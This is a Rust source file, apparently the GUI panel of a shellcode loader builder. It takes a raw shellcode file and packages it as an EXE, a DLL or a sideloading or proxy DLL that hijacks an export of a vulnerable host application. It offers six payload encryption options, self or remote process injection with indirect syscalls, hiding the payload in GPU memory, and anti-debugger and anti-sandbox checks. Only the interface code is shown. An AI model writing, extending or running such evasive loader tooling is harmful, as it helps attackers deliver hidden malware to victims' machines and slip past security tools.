use super::state::UiState;
use super::theme::{self, palette, space};
use super::widgets::{
    card, description, field_row, ghost_button, input_readonly, meta_line, pill, section_header,
    segmented, warn_banner, PillKind,
};
use crate::spec::{
    CheckId, EncryptionKind, LoaderKindSel, OutputFormSel, RemoteMethod, SelfInjectMethod,
    SideloadMode,
};
use eframe::egui::{self, FontFamily, FontId, RichText};
use std::fs;

pub fn draw(ui: &mut egui::Ui, st: &mut UiState) {
    egui::ScrollArea::vertical()
        .auto_shrink([false, false])
        .show(ui, |ui| {
            ui.set_min_width(ui.available_width());

            draw_shellcode(ui, st);
            ui.add_space(space::MD);
            draw_output(ui, st);
            ui.add_space(space::MD);
            if matches!(st.output, OutputFormSel::DllSideload) {
                draw_sideload(ui, st);
                ui.add_space(space::MD);
            }
            draw_encryption(ui, st);
            ui.add_space(space::MD);
            draw_loader(ui, st);
            ui.add_space(space::MD);
            draw_storage(ui, st);
            ui.add_space(space::MD);
            draw_checks(ui, st);

            if let Err(e) = st.to_spec_dry() {
                ui.add_space(space::SM);
                warn_banner(ui, &format!("{e}"));
            }

            ui.add_space(space::LG);
        });
}

// ---------------- shellcode

fn draw_shellcode(ui: &mut egui::Ui, st: &mut UiState) {
    let size_suffix = st
        .shellcode_path
        .as_ref()
        .and_then(|p| fs::metadata(p).ok())
        .map(|m| format!("{} bytes", m.len()));
    section_header(ui, "Shellcode", size_suffix.as_deref());

    card(ui, |ui| {
        field_row(ui, "File", |ui| {
            let path_str = st
                .shellcode_path
                .as_ref()
                .map(|p| p.display().to_string())
                .unwrap_or_default();
            let avail = ui.available_width() - 110.0;
            input_readonly(ui, &path_str, avail.max(180.0));
            if ghost_button(ui, "Browse…").clicked() {
                if let Some(p) = rfd::FileDialog::new()
                    .add_filter("Raw shellcode", &["bin", "raw"])
                    .pick_file()
                {
                    st.shellcode_path = Some(p);
                }
            }
        });
        if let Some(suf) = size_suffix.as_deref() {
            ui.add_space(4.0);
            meta_line(ui, &format!("{suf} loaded"));
        }
    });
}

// ---------------- output

fn draw_output(ui: &mut egui::Ui, st: &mut UiState) {
    section_header(ui, "Output", None);
    card(ui, |ui| {
        field_row(ui, "Format", |ui| {
            segmented(
                ui,
                &mut st.output,
                &[
                    (OutputFormSel::Exe,         "EXE"),
                    (OutputFormSel::Dll,         "DLL"),
                    (OutputFormSel::DllSideload, "SIDELOAD"),
                ],
            );
        });
        ui.add_space(6.0);
        field_row(ui, "Save to", |ui| {
            let mut s = st
                .delivery_path
                .as_ref()
                .map(|p| p.display().to_string())
                .unwrap_or_default();
            let avail = ui.available_width() - 110.0;
            let resp = ui.add(
                egui::TextEdit::singleline(&mut s)
                    .desired_width(avail.max(180.0))
                    .font(FontId::new(12.0, FontFamily::Monospace))
                    .text_color(palette::text())
                    .margin(egui::vec2(space::SM, space::XS + 1.0)),
            );
            if resp.changed() {
                st.delivery_path = if s.trim().is_empty() { None } else { Some(s.into()) };
            }
            if ghost_button(ui, "Browse…").clicked() {
                let default_name = match st.output {
                    OutputFormSel::Exe                                  => "out.exe",
                    OutputFormSel::Dll | OutputFormSel::DllSideload     => "out.dll",
                };
                if let Some(p) = rfd::FileDialog::new()
                    .set_file_name(default_name)
                    .save_file()
                {
                    st.delivery_path = Some(p);
                }
            }
        });
        if matches!(st.output, OutputFormSel::Dll) {
            ui.add_space(6.0);
            field_row(ui, "Export", |ui| {
                ui.add(
                    egui::TextEdit::singleline(&mut st.dll_export)
                        .hint_text("e.g. Hzv4_Run")
                        .desired_width(ui.available_width() - 110.0)
                        .font(FontId::new(12.0, FontFamily::Monospace))
                        .text_color(palette::text())
                        .margin(egui::vec2(space::SM, space::XS + 1.0)),
                );
                if ghost_button(ui, "🎲 roll").clicked() {
                    st.dll_export = suggest_export();
                }
            });
        }
    });
}

// ---------------- sideload

fn draw_sideload(ui: &mut egui::Ui, st: &mut UiState) {
    section_header(ui, "DLL Sideload", Some("self-inject only"));
    card(ui, |ui| {
        field_row(ui, "Target DLL", |ui| {
            let path_str = st
                .sideload
                .target_dll
                .as_ref()
                .map(|p| p.display().to_string())
                .unwrap_or_default();
            let avail = ui.available_width() - 110.0;
            input_readonly(ui, &path_str, avail.max(180.0));
            if ghost_button(ui, "Browse…").clicked() {
                if let Some(p) = rfd::FileDialog::new()
                    .add_filter("DLL", &["dll", "DLL"])
                    .pick_file()
                {
                    st.sideload.target_dll = Some(p);
                }
            }
        });
        ui.add_space(6.0);
        field_row(ui, "Hijack export", |ui| {
            ui.add(
                egui::TextEdit::singleline(&mut st.sideload.hijack_export)
                    .hint_text("e.g. DllRegisterServer")
                    .desired_width(ui.available_width().min(320.0))
                    .font(FontId::new(12.0, FontFamily::Monospace))
                    .text_color(palette::text())
                    .margin(egui::vec2(space::SM, space::XS + 1.0)),
            );
        });
        ui.add_space(6.0);
        field_row(ui, "Mode", |ui| {
            segmented(
                ui,
                &mut st.sideload.mode,
                &[
                    (SideloadMode::Sideload, "SIDELOAD"),
                    (SideloadMode::Proxy,    "PROXY"),
                ],
            );
        });

        match st.sideload.mode {
            SideloadMode::Sideload => {
                ui.add_space(6.0);
                description(
                    ui,
                    "Pure replacement DLL. Non-hijacked exports are no-op stubs. Drop alongside the vulnerable host app.",
                );
            }
            SideloadMode::Proxy => {
                ui.add_space(6.0);
                description(
                    ui,
                    "Non-hijacked exports forward to the original DLL via a generated .def. Uses dyncvoke + lazy_static.",
                );
                ui.add_space(6.0);
                field_row(ui, "Path", |ui| {
                    ui.checkbox(
                        &mut st.sideload.use_absolute_path,
                        RichText::new("use absolute target path (no rename needed)")
                            .font(theme::font_sans(11.0)),
                    );
                });
                if !st.sideload.use_absolute_path {
                    ui.add_space(6.0);
                    field_row(ui, "Renamed", |ui| {
                        ui.add(
                            egui::TextEdit::singleline(&mut st.sideload.renamed)
                                .hint_text("e.g. Shaping.dll")
                                .desired_width(ui.available_width().min(320.0))
                                .font(FontId::new(12.0, FontFamily::Monospace))
                                .text_color(palette::text())
                                .margin(egui::vec2(space::SM, space::XS + 1.0)),
                        );
                    });
                }
            }
        }

        if let Some(target) = st.sideload.target_dll.clone() {
            ui.add_space(6.0);
            match crate::pe::parse_exports(&target) {
                Ok(exports) => {
                    let total = exports.len();
                    let named = exports.iter().filter(|e| e.name.is_some()).count();
                    meta_line(
                        ui,
                        &format!("{total} exports parsed ({named} named) from {}", target.display()),
                    );
                }
                Err(e) => {
                    meta_line(ui, &format!("could not parse exports: {e}"));
                }
            }
        }
    });
}

// ---------------- encryption

fn draw_encryption(ui: &mut egui::Ui, st: &mut UiState) {
    section_header(ui, "Encryption", Some("6 algorithms"));
    card(ui, |ui| {
        field_row(ui, "Method", |ui| {
            egui::ComboBox::from_id_source("rp_encryption_combo")
                .selected_text(st.encryption.label())
                .show_ui(ui, |ui| {
                    for k in [
                        EncryptionKind::Xor8,
                        EncryptionKind::AesCtr,
                        EncryptionKind::Rc4,
                        EncryptionKind::Khufu,
                        EncryptionKind::Ecies,
                        EncryptionKind::CamelliaToy,
                    ] {
                        ui.selectable_value(&mut st.encryption, k, k.label());
                    }
                });
        });
        ui.add_space(6.0);
        description(ui, encryption_blurb(st.encryption));
    });
}

fn encryption_blurb(k: EncryptionKind) -> &'static str {
    match k {
        EncryptionKind::Xor8        => "32-byte key, cycled. Smallest decoder, weakest hiding.",
        EncryptionKind::AesCtr      => "AES-256-CTR with zero IV. RustCrypto crates in the loader.",
        EncryptionKind::Rc4         => "RC4 KSA + PRGA. No crate dependency.",
        EncryptionKind::Khufu       => "16-round Feistel, key-dependent S-boxes, 8-byte block.",
        EncryptionKind::Ecies       => "secp256k1 ECDH + sha2 KDF + XOR stream. Non-deterministic.",
        EncryptionKind::CamelliaToy => "Small Feistel toy with one 256-byte S-box (not RFC 3713).",
    }
}

// ---------------- loader

fn draw_loader(ui: &mut egui::Ui, st: &mut UiState) {
    section_header(ui, "Injection", None);
    card(ui, |ui| {
        field_row(ui, "Category", |ui| {
            segmented(
                ui,
                &mut st.loader,
                &[
                    (LoaderKindSel::SelfInject, "SELF"),
                    (LoaderKindSel::Remote,     "REMOTE"),
                ],
            );
        });
        ui.add_space(6.0);
        field_row(ui, "Method", |ui| match st.loader {
            LoaderKindSel::SelfInject => {
                egui::ComboBox::from_id_source("rp_selfinject_combo")
                    .selected_text(st.selfinject_method.label())
                    .show_ui(ui, |ui| {
                        for m in [
                            SelfInjectMethod::Fiber,
                            SelfInjectMethod::Calendar,
                            SelfInjectMethod::Desktops,
                            SelfInjectMethod::WinStations,
                            SelfInjectMethod::GeoId,
                        ] {
                            ui.selectable_value(&mut st.selfinject_method, m, m.label());
                        }
                    });
            }
            LoaderKindSel::Remote => {
                egui::ComboBox::from_id_source("rp_remote_combo")
                    .selected_text(st.remote_method.label())
                    .show_ui(ui, |ui| {
                        for m in [
                            RemoteMethod::EarlyCascade,
                            RemoteMethod::NtCreateThreadEx,
                        ] {
                            ui.selectable_value(&mut st.remote_method, m, m.label());
                        }
                    });
            }
        });
        ui.add_space(6.0);
        ui.horizontal(|ui| {
            ui.add_space(96.0);
            let tag = match st.loader {
                LoaderKindSel::SelfInject => "self-injection",
                LoaderKindSel::Remote => "remote injection",
            };
            pill(ui, tag, PillKind::Accent);
            ui.add_space(4.0);
            if matches!(st.loader, LoaderKindSel::SelfInject)
                && matches!(st.selfinject_method, SelfInjectMethod::Fiber)
            {
                pill(ui, "indirect syscall", PillKind::Warn);
            }
            if matches!(st.loader, LoaderKindSel::Remote)
                && matches!(st.remote_method, RemoteMethod::NtCreateThreadEx)
            {
                pill(ui, "indirect syscall", PillKind::Warn);
            }
        });
        if matches!(st.loader, LoaderKindSel::Remote) {
            ui.add_space(6.0);
            field_row(ui, "Target", |ui| {
                ui.add(
                    egui::TextEdit::singleline(&mut st.target_exe)
                        .hint_text("Notepad.exe")
                        .desired_width(ui.available_width().min(320.0))
                        .font(FontId::new(12.0, FontFamily::Monospace))
                        .text_color(palette::text())
                        .margin(egui::vec2(space::SM, space::XS + 1.0)),
                );
            });
        }
    });
}

// ---------------- storage / gpu

fn draw_storage(ui: &mut egui::Ui, st: &mut UiState) {
    section_header(ui, "Storage", None);
    card(ui, |ui| {
        let enabled = matches!(st.loader, LoaderKindSel::SelfInject);
        if !enabled {
            st.gpu_storage = false;
        }
        ui.add_enabled_ui(enabled, |ui| {
            ui.checkbox(
                &mut st.gpu_storage,
                RichText::new("Enable GPU ShellExec").font(theme::font_sans(12.0)),
            );
        });
        ui.add_space(4.0);
        description(
            ui,
            "Probes for an NVIDIA GPU at runtime. If present, the encrypted payload is stashed in GPU VRAM via CUDA, host copy is wiped, pulled back just before execution. Falls back to host memory otherwise. Self-inject only.",
        );
    });
}

// ---------------- checks

fn draw_checks(ui: &mut egui::Ui, st: &mut UiState) {
    let active = st.checks_on.iter().filter(|(_, on)| **on).count();
    section_header(ui, "Anti-analysis", Some(&format!("{active} active")));
    card(ui, |ui| {
        check_box(ui, st, CheckId::CheckRemote, "Remote debugger probe", "NtQueryInformationProcess(ProcessDebugObjectHandle)");
        check_box(ui, st, CheckId::DebugPort,   "Process debug port",    "NtQueryInformationProcess(ProcessDebugPort)");
        check_box(ui, st, CheckId::TebFlag,     "PEB BeingDebugged",     "inline asm read of gs:[0x60]+0x02");
        check_box(ui, st, CheckId::VecInt3,     "Vectored INT3 trap",    "AddVectoredExceptionHandler + int 3");
        check_box(ui, st, CheckId::NtDelay,     "NtDelayExecution nap",  "sleep skew to fight sandbox time accel");

        if st.checks_on.get(&CheckId::NtDelay).copied().unwrap_or(false) {
            ui.add_space(6.0);
            field_row(ui, "Nap ms", |ui| {
                let buf = st
                    .check_params
                    .entry("nt_nap.ms".into())
                    .or_insert_with(|| "3000".into());
                ui.add(
                    egui::TextEdit::singleline(buf)
                        .desired_width(120.0)
                        .font(FontId::new(12.0, FontFamily::Monospace))
                        .text_color(palette::text())
                        .margin(egui::vec2(space::SM, space::XS + 1.0)),
                );
            });
            field_row(ui, "Placement", |ui| {
                let key = "nt_nap.placement".to_string();
                let cur = st
                    .check_params
                    .entry(key.clone())
                    .or_insert_with(|| "between".into());
                egui::ComboBox::from_id_source("rp_nap_placement")
                    .selected_text(cur.clone())
                    .show_ui(ui, |ui| {
                        for opt in ["at_start", "between", "before_exec"] {
                            ui.selectable_value(cur, opt.to_string(), opt);
                        }
                    });
            });
        }
    });
}

fn check_box(ui: &mut egui::Ui, st: &mut UiState, id: CheckId, label: &str, blurb: &str) {
    let on = st.checks_on.entry(id).or_insert(false);
    ui.checkbox(on, RichText::new(label).font(theme::font_sans(12.0)));
    ui.horizontal(|ui| {
        ui.add_space(24.0);
        ui.label(
            RichText::new(blurb)
                .font(theme::font_sans(10.5))
                .color(palette::text_muted()),
        );
    });
    ui.add_space(2.0);
}

fn suggest_export() -> String {
    let bytes = crate::emit::rng::os_seed_bytes(6);
    let alphabet: &[u8] = b"abcdefghjkmnpqrstuvwxyz23456789";
    let mut s = String::from("Fn_");
    for b in bytes {
        s.push(alphabet[(b as usize) % alphabet.len()] as char);
    }
    s
}

impl UiState {
    fn to_spec_dry(&self) -> Result<(), crate::spec::BuildSpecError> {
        let mut clone = self.clone();
        clone.shellcode_path = clone.shellcode_path.or_else(|| Some(std::path::PathBuf::from(".sentinel"))); // bypass missing-file gate for live validation
        let _ = clone.to_spec()?;
        Ok(())
    }
}
